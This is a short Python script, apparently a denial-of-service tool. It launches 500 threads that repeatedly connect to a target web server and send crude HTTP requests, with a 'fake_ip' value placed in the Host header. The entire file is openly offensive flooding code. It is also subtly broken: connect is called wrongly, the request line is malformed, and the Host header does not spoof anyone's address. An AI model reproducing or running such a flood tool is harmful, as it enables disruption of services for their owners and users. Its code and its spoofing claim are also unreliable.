import socket
import threading

target = ""
fake_ip = ""
port = 80

def ddosAttack():
    attacking = True
    while(attacking):
        packet = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        packet.connect(target,port)
        packet.sendto( ("Get /" + target + " HTTP/1,1\r\n").encode('ascii'),(target,port) )
        packet.sendto( ("Host: " + fake_ip + "\r\n\r\n").encode('ascii'),(target,port) )
        packet.close()
        
for i in range(500):
    thread = threading.Thread(target=ddosAttack)
    thread.start()